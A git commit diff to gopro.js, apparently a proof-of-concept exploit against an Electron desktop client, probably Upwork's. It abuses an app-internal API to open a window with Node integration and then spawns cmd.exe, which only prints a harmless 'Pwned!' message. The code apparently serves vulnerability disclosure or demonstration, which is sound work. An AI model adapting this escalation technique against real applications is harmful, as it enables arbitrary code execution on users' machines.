ffcdaefb7086367219d5763ef421e7e75c657537
vinhjaxt <ngoc.lo.dang@gmail.com>
2020-02-06 20:06:03 +0700

    Update gopro.js

--- gopro.js
+++ gopro.js
@@ -1,7 +1,7 @@
 if (typeof require === 'undefined') {
   UTA.OSServices.otherRendererWindowOpen(location.href, '', {webPreferences:{nodeIntegration: true}}).then(function () {
     console.log('Done')
-    UTA.OSServices.callBrowserWindowMethod('destroy', []).then(console.log).catch(alert)
+    // UTA.OSServices.callBrowserWindowMethod('destroy', []).then(console.log).catch(alert)
   }).catch(alert)
 }else{
   var fs = require('fs')
@@ -11,5 +11,5 @@ if (typeof require === 'undefined') {
   var cp = require('child_process')
   var child = cp.spawn('cmd', ['/c', 'start', 'cmd.exe', '/c', 'echo Pwned! Hello upwork! && pause'], { detached: true, stdio: [ 'ignore', out, err ] })
   child.unref()
-  require('electron').remote.getCurrentWindow().destroy()
+  // require('electron').remote.getCurrentWindow().destroy()
 }
